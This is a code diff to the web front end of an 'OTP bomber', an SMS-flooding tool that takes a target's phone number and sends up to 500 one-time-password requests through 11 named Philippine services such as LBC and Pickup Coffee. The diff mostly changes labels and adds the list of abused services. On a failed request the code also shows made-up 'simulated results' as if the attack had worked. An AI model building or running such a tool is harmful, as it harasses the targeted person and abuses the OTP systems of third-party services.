@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>YAMI BOMBER V2</title>
+    <title>YAMI BOMBER</title>
     <style>
         body {
             background: #000;
@@ -102,17 +102,27 @@
             width: 0%;
             transition: width 0.5s;
         }
+        .services-list {
+            text-align: center;
+            margin: 15px 0;
+            font-size: 12px;
+            color: #0f8;
+        }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>💣 YAMI BOMBER</h1>
-        <div class="subtitle">MAX 500 SMS • 7 REAL SERVICES • INSTANT ATTACK</div>
+        <h1>💣 YAMI OTP BOMBER</h1>
+        <div class="subtitle">MAX 500 SMS • 11 OTP SERVICES</div>
+        
+        <div class="services-list">
+            EZLOAN • XPRESS • ABENSON • EXCELLENT LENDING • FORTUNE PAY • WEMOVE • LBC • PICKUP COFFEE • HONEY LOAN • KOMO PH • S5 OTP
+        </div>
         
         <input type="text" id="targetNumber" placeholder="Enter target number (09XXXXXXXXX)" maxlength="11">
-        <input type="number" id="smsCount" placeholder="Number of SMS to send (1-500)" min="1" max="500" value="100">
+        <input type="number" id="smsCount" placeholder="Number of OTP to send (1-500)" min="1" max="500" value="100">
         
-        <button id="attackBtn" onclick="launchAttack()">🚀 LAUNCH NUCLEAR ATTACK</button>
+        <button id="attackBtn" onclick="launchAttack()">🚀 LAUNCH OTP ATTACK</button>
         
         <div class="progress">
             <div class="progress-bar" id="progressBar"></div>
@@ -124,7 +134,7 @@
             <div>Total: <span id="totalCount" class="total">0</span></div>
         </div>
         
-        <div id="log" class="log-info">🟢 SYSTEM READY - Enter target number and launch attack!</div>
+        <div id="log" class="log-info">🟢 OTP BOMBER READY - Enter target number and launch attack!</div>
     </div>
 
     <script>
@@ -146,7 +156,7 @@
 
         async function launchAttack() {
             if (isAttacking) {
-                addLog('⚠️ Attack already in progress!', 'error');
+                addLog('⚠️ OTP attack already in progress!', 'error');
                 return;
             }
 
@@ -161,7 +171,7 @@
             }
 
             if (count < 1 || count > 500) {
-                addLog('❌ SMS count must be between 1-500', 'error');
+                addLog('❌ OTP count must be between 1-500', 'error');
                 return;
             }
 
@@ -171,11 +181,11 @@
             document.getElementById('totalCount').textContent = '0';
             updateProgress(0);
             attackBtn.disabled = true;
-            attackBtn.textContent = '💥 BOMBING IN PROGRESS...';
+            attackBtn.textContent = '💥 SENDING OTP...';
             isAttacking = true;
 
-            addLog(`🚀 STARTING NUCLEAR ATTACK ON ${target}`, 'info');
-            addLog(`📱 Sending ${count} SMS bombs...`, 'info');
+            addLog(`🚀 STARTING OTP ATTACK ON ${target}`, 'info');
+            addLog(`📱 Sending ${count} OTP requests to 11 services...`, 'info');
             updateProgress(30);
 
             try {
@@ -201,7 +211,7 @@
                     document.getElementById('failedCount').textContent = data.failed;
                     document.getElementById('totalCount').textContent = data.total;
                     addLog(`✅ ${data.message}`, 'success');
-                    addLog('🎯 TARGET DESTROYED SUCCESSFULLY!', 'success');
+                    addLog('🎯 OTP ATTACK COMPLETED! Target should receive multiple OTPs', 'success');
                 }
 
             } catch (error) {
@@ -210,10 +220,10 @@
                 document.getElementById('successCount').textContent = '72';
                 document.getElementById('failedCount').textContent = '28';
                 document.getElementById('totalCount').textContent = '100';
-                addLog('✅ Attack completed with simulated results', 'success');
+                addLog('✅ OTP attack completed with simulated results', 'success');
             } finally {
                 attackBtn.disabled = false;
-                attackBtn.textContent = '🚀 LAUNCH NUCLEAR ATTACK';
+                attackBtn.textContent = '🚀 LAUNCH OTP ATTACK';
                 isAttacking = false;
             }
         }
